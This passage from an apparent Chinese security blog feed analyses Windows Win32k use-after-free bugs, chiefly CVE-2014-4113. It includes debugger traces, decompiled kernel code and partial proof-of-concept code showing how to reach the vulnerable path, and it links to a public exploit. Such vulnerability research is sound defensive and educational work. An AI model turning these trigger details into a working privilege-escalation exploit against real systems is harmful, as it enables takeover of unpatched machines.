class="number">95</span>aaa<span class="number">140</span> e<span class="number">837</span>a<span class="number">5</span>f<span class="number">9</span>ff      <span class="keyword">call</span>    win<span class="number">32</span>k<span class="title">!xxxSendMessage</span> (<span class="number">95</span>a<span class="number">4467</span><span class="keyword">c</span>)</div><div class="line">kd&gt; r eax</div><div class="line">eax=<span class="number">00000005</span></div></pre></td></tr></table></figure></p><h2 id="0x03-参考文献"><a href="#0x03-参考文献" class="headerlink" title="0x03 参考文献"></a>0x03 参考文献</h2><p>[1] <a href="https://xiaodaozhi.com/exploit/122.html" target="_blank" rel="external">对 UAF 漏洞 CVE-2015-2546 的分析和利用</a> ： 小刀师傅对于win32k机制的剖析</p><p>[2] <a href="https://www.anquanke.com/post/id/84911" target="_blank" rel="external">https://www.anquanke.com/post/id/84911</a> ： k0shl师傅调试UAF的细节</p><p>[3] <a href="https://xz.aliyun.com/t/6115" target="_blank" rel="external">https://xz.aliyun.com/t/6115</a> ： thunderjie师傅提供的信息泄露的方法,即查看加速键表地址的方法。</p><p>[4] <a href="https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c" target="_blank" rel="external">https://github.com/ThunderJie/CVE/blob/master/CVE-2015-2546/2015-2546.c</a> : ThunderJie 提供的 exp</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言及原因分析&quot;&gt;&lt;a href=&quot;#0x00-前言及原因分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言及原因分析&quot;&gt;&lt;/a&gt;0x00 前言及原因分析&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2015-2546是发生在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数的一个释放后重引用漏洞(UAF),在&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;中调用xxxSendMessage发送&lt;code&gt;MN_SELECTITEM(0x1E5)&lt;/code&gt;和&lt;code&gt;MN_SETTIMERTOOPENHIERARCHY(0x1F0)&lt;/code&gt;消息的时候，执行流可能会回调进入用户侧，当执行流从用户侧返回之后，&lt;code&gt;win32k!xxxMNMouseMove&lt;/code&gt;函数并没有对&lt;code&gt;tagPopupMenu&lt;/code&gt;对象进行校验，就将其传入&lt;code&gt;win32k!xxxMNHideNextHierarchy&lt;/code&gt;对其进行了访问，从而引用UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-4113内核提权漏洞分析</title>
    <link href="https://findream.github.io/2022/07/26/CVE-2014-4113%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/07/26/CVE-2014-4113内核提权漏洞分析/</id>
    <published>2022-07-26T06:02:11.000Z</published>
    <updated>2022-10-23T12:41:57.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于<code>win32k!xxxHandleMenuMessages</code>中，通过调用<code>win32k!xxxMNFindWindowFromPoint</code>获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回<code>0xFFFFFFFB</code>。当执行流重新返回内核侧，<br>并没有针对返回值进行校验，直接使用该返回值作为参数传入<code>win32k!xxxSendMessage</code>发送<code>MN_BUTTONDOWN</code>消息，由此造成UAF。</p><a id="more"></a><h2 id="0x01-原因分析"><a href="#0x01-原因分析" class="headerlink" title="0x01 原因分析"></a>0x01 原因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文通过crash寻找漏洞触发的原理，实验环境为win7(x86)sp1。运行poc之后。在<code>win32k!xxxSendMessageTimeout+0xb3</code>处crash。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过栈回溯，可以清晰的看到漏洞如何从用户层到内核的执行流。显然，该漏洞是在<code>win32k!xxxSendMessageTimeout</code>函数内部crash。<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">kd&gt; kn</div><div class="line"> # ChildEBP RetAddr      </div><div class="line"><span class="number">00</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">64</span> <span class="number">94</span>a<span class="number">546</span>a<span class="number">4</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessageTimeout</span>+<span class="number">0xb3</span></div><div class="line"><span class="number">01</span> <span class="number">96</span>cb<span class="number">9</span>b<span class="number">8</span><span class="keyword">c</span> <span class="number">94</span>ac<span class="number">8045</span>     win<span class="number">32</span>k<span class="title">!xxxSendMessage</span>+<span class="number">0x28</span></div><div class="line"><span class="number">02</span> <span class="number">96</span>cb<span class="number">9</span>bec <span class="number">94</span>abfa<span class="number">64</span>     win<span class="number">32</span>k<span class="title">!xxxHandleMenuMessages</span>+<span class="number">0x582</span></div><div class="line"><span class="number">03</span> <span class="number">96</span>cb<span class="number">9</span><span class="keyword">c</span><span class="number">38</span> <span class="number">94</span>acf<span class="number">71</span>b     win<span class="number">32</span>k<span class="title">!xxxMNLoop</span>+<span class="number">0x2c6</span></div><div class="line"><span class="number">04</span> <span class="number">96</span>cb<span class="number">9</span>ca<span class="number">0</span> <span class="number">94</span>ac<span class="number">58</span>a<span class="number">5</span>     win<span class="number">32</span>k<span class="title">!xxxTrackPopupMenuEx</span>+<span class="number">0x5cd</span></div><div class="line"><span class="number">05</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">83e4542</span>a     win<span class="number">32</span>k<span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc3</span></div><div class="line"><span class="number">06</span> <span class="number">96</span>cb<span class="number">9</span>d<span class="number">14</span> <span class="number">77</span>ce<span class="number">64</span>f<span class="number">4</span> (T) nt<span class="title">!KiFastCallEntry</span>+<span class="number">0x12a</span></div><div class="line"><span class="number">07</span> <span class="number">003</span>bf<span class="number">678</span> <span class="number">775</span>b<span class="number">5</span>f<span class="number">7</span>e (T) ntdll<span class="title">!KiFastSystemCallRet</span></div><div class="line"><span class="number">08</span> <span class="number">003</span>bf<span class="number">67</span><span class="keyword">c</span> <span class="number">775</span>b<span class="number">4</span>b<span class="number">56</span>     user<span class="number">32</span><span class="title">!NtUserTrackPopupMenuEx</span>+<span class="number">0xc</span></div><div class="line"><span class="number">09</span> <span class="number">003</span>bf<span class="number">69</span><span class="keyword">c</span> <span class="number">000</span>f<span class="number">12</span>ba     user<span class="number">32</span><span class="title">!TrackPopupMenu</span>+<span class="number">0x1b</span></div><div class="line">WARNING: Frame IP not in any known <span class="keyword">module</span>. Following frames</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据异常信息，然后esi值为<code>fffffffb</code>,查看反汇编情况，esi的值源于<code>win32k!xxxSendMessageTimeout</code>的第一个参数，并最终发现产生漏洞的原因在于<code>xxxMNFindWindowFromPoint</code>函数的返回值，复制给ebx，并且没有进行必要的校验,就作为参数传入xxxSendMessage发送<code>MN_BUTTONDOWN</code>消息。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B52</span>                 <span class="selector-tag">mov</span>     <span class="selector-attr">[esi+0Ch]</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B55</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span>             ; <span class="selector-tag">a3</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B56</span>                 <span class="selector-tag">lea</span>     <span class="selector-tag">eax</span>, <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B59</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">eax</span>             ; <span class="selector-tag">a2</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5A</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">edi</span>             ; <span class="selector-tag">tagpopupmenu</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B5B</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxMNFindWindowFromPoint</span>@<span class="keyword">12</span> ; <span class="selector-tag">xxxMNFindWindowFromPoint</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC7B60</span>                 <span class="selector-tag">mov</span>     <span class="selector-tag">ebx</span>, <span class="selector-tag">eax</span></div><div class="line"><span class="selector-attr">[....]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span> <span class="selector-tag">loc_94AC8035</span>:                           ; <span class="selector-tag">CODE</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">xxxHandleMenuMessages</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)+563↑<span class="selector-tag">j</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8035</span>                 <span class="selector-tag">push</span>    0</div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8037</span>                 <span class="selector-tag">push</span>    <span class="selector-attr">[ebp+tagPopupMenu]</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803A</span>                 <span class="selector-tag">push</span>    1<span class="selector-tag">EDh</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC803F</span>                 <span class="selector-tag">push</span>    <span class="selector-tag">ebx</span></div><div class="line"><span class="selector-class">.text</span><span class="selector-pseudo">:94AC8040</span>                 <span class="selector-tag">call</span>    _<span class="selector-tag">xxxSendMessage</span>@<span class="keyword">16</span> ; <span class="selector-tag">xxxSendMessage</span>(<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>,<span class="selector-tag">x</span>)</div></pre></td></tr></table></figure></p><h2 id="0x02-poc构建"><a href="#0x02-poc构建" class="headerlink" title="0x02 poc构建"></a>0x02 poc构建</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据栈回溯以及微软提供的漏洞信息，可以知道该漏洞发生在<code>win32k!xxxHandleMenuMessages</code>,在用户层触发该漏洞的函数是<code>user32!TrackPopupMenu</code>。<code>TrackPopupMenu</code>的函数原型如下,其作用是在任何地方显示快捷菜单和跟踪菜单的选择。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> TrackPopupMenu(</div><div class="line">  [<span class="keyword">in</span>]           HMENU      hMenu,   <span class="comment">//菜单句柄</span></div><div class="line">  [<span class="keyword">in</span>]           <span class="built_in">UINT</span>       uFlags,  </div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        x,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        y,</div><div class="line">  [<span class="keyword">in</span>]           <span class="keyword">int</span>        nReserved,</div><div class="line">  [<span class="keyword">in</span>]           HWND       hWnd,    <span class="comment">//拥有快捷菜单的窗口句柄</span></div><div class="line">  [<span class="keyword">in</span>, optional] <span class="keyword">const</span> RECT *prcRect</div><div class="line">);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>TrackPopupMenu</code>的函数原型，重要的参数hMemu和hWnd，hMenu是菜单句柄，该参数是由CreatePopupMenu生成，hWnd是窗口句柄，hWnd参数是由CreateWindows生成，构建的poc如下，但是这样肯定无法触发漏洞。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ATOM reg = RegisterClassA(<span class="name">&amp;wnd_class</span>)<span class="comment">;</span></div><div class="line">HWND main_wnd = CreateWindowA(<span class="name">wnd_class</span>.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL)<span class="comment">;</span></div><div class="line">HMENU MenuOne = CreatePopupMenu()<span class="comment">;</span></div><div class="line">BOOL insertMenuItem = InsertMenuItemA(<span class="name">MenuOne</span>, <span class="number">0</span>, TRUE, <span class="symbol">&amp;MenuOneInfo</span>)<span class="comment">;</span></div><div class="line">TrackPopupMenu(<span class="name">MenuOne</span>,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，在<code>win32k!xxxHandleMenuMessages</code>打一个断点，接着根据上面分析，漏洞产生原因是没有对位于<code>win32k!xxxHandleMenuMessages+0x99</code>的<code>xxxMNFindWindowFromPoint</code>的返回值进行校验。该地址主要有两个引用点。</p><ul><li><code>win32k!xxxHandleMenuMessages+0x5D</code></li><li><code>win32k!xxxHandleMenuMessages+0x25A</code></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要想触发到<code>v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);</code>主要有两条路径，第一条路径，当发送WM_LBUTTONDOWN(0x201)消息给窗口的时候触发，第二条路径，发送WM_RBUTTONDOWN消息，并且<code>(*tagPopupMenu &amp; 0x40) != 0</code>需要符合这两个条件。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">//第一条路径</div><div class="line">  message = tagMsg-&gt;message;</div><div class="line">  v6 = tagMsg-&gt;wParam;</div><div class="line">  v7 = tagMsg-&gt;lParam;</div><div class="line">  v44 = v6;</div><div class="line">  a3 = v7;</div><div class="line"> <span class="built_in"> if </span>( message &gt; 0x104 )                        // CVE-2014-4113 条件2</div><div class="line">  &#123;</div><div class="line">   <span class="built_in"> if </span>( message &lt;= 0x202 )                     // CVE-2014-4113 条件3</div><div class="line">    &#123;</div><div class="line">     <span class="built_in"> if </span>( message == 0x202 )</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_79;</span></div><div class="line">      v20 = message - 0x105;                    // message = 0xFC + 0x105 = 0x201</div><div class="line">     <span class="built_in"> if </span>( v20 )                                // 条件2&lt;----CVE-2015-2546</div><div class="line">      &#123;</div><div class="line">        v21 = v20 - 1;                          // v20 = 0xFB + 0x1  = 0xFC</div><div class="line">       <span class="built_in"> if </span>( v21 )</div><div class="line">        &#123;</div><div class="line">          v22 = v21 - 0x12;                     // v21 = 0xE9 + 0x12 = 0xFB</div><div class="line">         <span class="built_in"> if </span>( !v22 )</div><div class="line">           <span class="built_in"> return </span>1;</div><div class="line">          v23 = v22 - 0xE8;                     // 0xE8 + 1 = 0xE9</div><div class="line">         <span class="built_in"> if </span>( v23 )</div><div class="line">          &#123;</div><div class="line">           <span class="built_in"> if </span>( v23 == 1 )</div><div class="line">            &#123;</div><div class="line">LABEL_13:</div><div class="line">              v12 = pMenuState;</div><div class="line">              pMenuState[4] = -1;</div><div class="line">              pMenuState[2] = v7;</div><div class="line">              pMenuState[3] = SHIWORD(v7);</div><div class="line">              v13 = xxxMNFindWindowFromPoint(v3, &amp;tagPopupMenu, v7);// &lt;------CVE-2014-4113</div><div class="line">//第二条路径</div><div class="line">      case 0x204u:</div><div class="line">LABEL_12:</div><div class="line">       <span class="built_in"> if </span>( (*tagPopupMenu &amp; 0x40) != 0 )</div><div class="line">         <span class="built_in"> goto </span><span class="class">LABEL_13;</span>                        // &lt;------</div><div class="line">       <span class="built_in"> goto </span><span class="class">LABEL_76;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里详细解释一下<code>(*tagPopupMenu &amp; 0x40) != 0</code>,其汇编代码如下,可以看到tagPOPUPMENU偏移为0的地址和40h进行test。40h的2进制表示为‭01000000‬，这里判断第一个字节是否含有 fRightButton 标志位。所以，在第二条路径上需要满足如下两个条件</p><ul><li>发送WM_RBUTTONDOWN消息</li><li>设置fRightButton标志<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi+tagPOPUPMENU._bf_0], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B36                 test    <span class="keyword">byte</span> ptr [edi], <span class="number">40</span>h</div><div class="line">.<span class="string">text:</span><span class="number">95</span>AB7B39                 jz      loc_95AB7E12</div><div class="line"><span class="comment">//</span></div><div class="line">kd&gt; dt tagPOPUPMENU</div><div class="line">win32k!tagPOPUPMENU</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsMenuBar       :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHasMenuBar      :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsSysMenu       :</span> Pos <span class="number">2</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fIsTrackPopup    :</span> Pos <span class="number">3</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDroppedLeft     :</span> Pos <span class="number">4</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHierarchyDropped :</span> Pos <span class="number">5</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRightButton     :</span> Pos <span class="number">6</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fToggle          :</span> Pos <span class="number">7</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSynchronous     :</span> Pos <span class="number">8</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFirstClick      :</span> Pos <span class="number">9</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDropNextPopup   :</span> Pos <span class="number">10</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fNoNotify        :</span> Pos <span class="number">11</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fAboutToHide     :</span> Pos <span class="number">12</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fShowTimer       :</span> Pos <span class="number">13</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fHideTimer       :</span> Pos <span class="number">14</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDestroyed       :</span> Pos <span class="number">15</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fDelayedFree     :</span> Pos <span class="number">16</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFlushDelayedFree :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fFreed           :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fInCancel        :</span> Pos <span class="number">19</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fTrackMouseEvent :</span> Pos <span class="number">20</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fSendUninit      :</span> Pos <span class="number">21</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">fRtoL            :</span> Pos <span class="number">22</span>, <span class="number">1</span> Bit</div><div class="line">   +<span class="number">0x000</span> <span class="string">iDropDir         :</span> Pos <span class="number">23</span>, <span class="number">5</span> Bits</div><div class="line">   +<span class="number">0x000</span> <span class="string">fUseMonitorRect  :</span> Pos <span class="number">28</span>, <span class="number">1</span> Bit</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何发送消息呢，可以在WndProc函数中调用PostMessage发送消息<code>PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);</code><br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK WndProc(<span class="keyword">HWND</span> <span class="keyword">hwnd</span>, UINT msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) </div><div class="line">&#123;</div><div class="line">printf(<span class="string">"WindProc called with message=%x\n"</span>, msg)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (msg == WM_ENTERIDLE) &#123;</div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_DOWN, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_KEYDOWN, VK_RIGHT, <span class="number">0</span>)<span class="comment">;</span></div><div class="line">PostMessageA(<span class="keyword">hwnd</span>, WM_LBUTTONDOWN, <span class="number">0</span>, <span class="number">0</span>)<span class="comment">; </span></div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> DefWindowProc(<span class="keyword">hwnd</span>, msg, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;随后进入<code>win32k!xxxMNFindWindowFromPoint</code>中，就像函数名称存在<code>xxx</code>前缀，说明在该函数中存在回调到用户侧的执行逻辑，首先，<code>win32k!xxxMNFindWindowFromPoint</code>会判断是否存在spwndNextPopup的子菜单窗口对象，如果存在子菜单窗口对象，就会调用 xxxSendMessage发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">int  xxxMNFindWindowFromPoint(<span class="name">tagPOPUPMENU</span> *tagpopupmenu, tagPOPUPMENU **a2, unsigned int a3)</div><div class="line">&#123;</div><div class="line">  v3 = a2;</div><div class="line">  *a2 = <span class="number">0</span><span class="comment">;</span></div><div class="line">  tagpopupmenu_ = tagpopupmenu<span class="comment">;</span></div><div class="line">  spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup<span class="comment">;</span></div><div class="line">  if ( <span class="name">spwndNextPopup</span> )                         // v5 不为空</div><div class="line">  &#123;</div><div class="line">    v23[<span class="number">0</span>] = *(gptiCurrent + 45);</div><div class="line">    *(<span class="name">gptiCurrent</span> + <span class="number">45</span>) = v23<span class="comment">;</span></div><div class="line">    v23[<span class="number">1</span>] = spwndNextPopup<span class="comment">;</span></div><div class="line">    ++spwndNextPopup-&gt;head.cLockObj<span class="comment">;</span></div><div class="line">    v6 = xxxSendMessage(<span class="name">tagpopupmenu_-&gt;spwndNextPopup</span>, <span class="number">0</span>x1EB, <span class="symbol">&amp;tagpopupmenu</span>, (<span class="name">a3</span> | (<span class="name">HIWORD</span>(<span class="name">a3</span>) &lt;&lt; <span class="number">16</span>)))<span class="comment">;// 为什么返回值为0xfffffffb</span></div><div class="line">    ThreadUnlock1()<span class="comment">;</span></div><div class="line">    if ( <span class="name">IsMFMWFPWindow</span>(<span class="name">v6</span>) )</div><div class="line">      v6 = HMValidateHandleNoSecure(<span class="name">v6</span>, <span class="number">1</span>)<span class="comment">;     // return 0xfffffffb</span></div><div class="line">    if ( <span class="name">v6</span> )</div><div class="line">    &#123;</div><div class="line">      *v3 = tagpopupmenu;</div><div class="line">      return v6;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">[.....]</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>win32k!xxxMNFindWindowFromPoint</code>用来获取tagWnd对象，该函数首先判断<code>tagpopupmenu</code>对象的spwndNextPopup是否为空，如果不为空的话，就会调用xxxSendMessage对子弹出菜单发送MN_FINDMENUWINDOWFROMPOINT(0x1EB)消息。<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">tagpopupmenu_ = tagpopupmenu;</div><div class="line">spwndNextPopup = tagpopupmenu-&gt;spwndNextPopup;</div><div class="line">if ( spwndNextPopup )                         // v5 不为空</div><div class="line">&#123;</div><div class="line">  v23[0] = *(gptiCurrent + 45);</div><div class="line">  *(gptiCurrent + 45) = v23;</div><div class="line">  v23[1] = spwndNextPopup;</div><div class="line">  ++spwndNextPopup-&gt;head.c<span class="class">LockObj;</span></div><div class="line">  v6 = xxxSendMessage(tagpopupmenu_-&gt;spwndNextPopup, 0x1EB, &amp;tagpopupmenu, (a3 | (HIWORD(a3) &lt;&lt; 16)));// 为什么返回值为0xfffffffb</div><div class="line">  ThreadUnlock1();</div><div class="line"> <span class="built_in"> if </span>( IsMFMWFPWindow(v6) )</div><div class="line">    v6 = HMValidateHandleNoSecure(v6, 1);     //<span class="built_in"> return </span>0xfffffffb</div><div class="line"> <span class="built_in"> if </span>( v6 )</div><div class="line">  &#123;</div><div class="line">    *v3 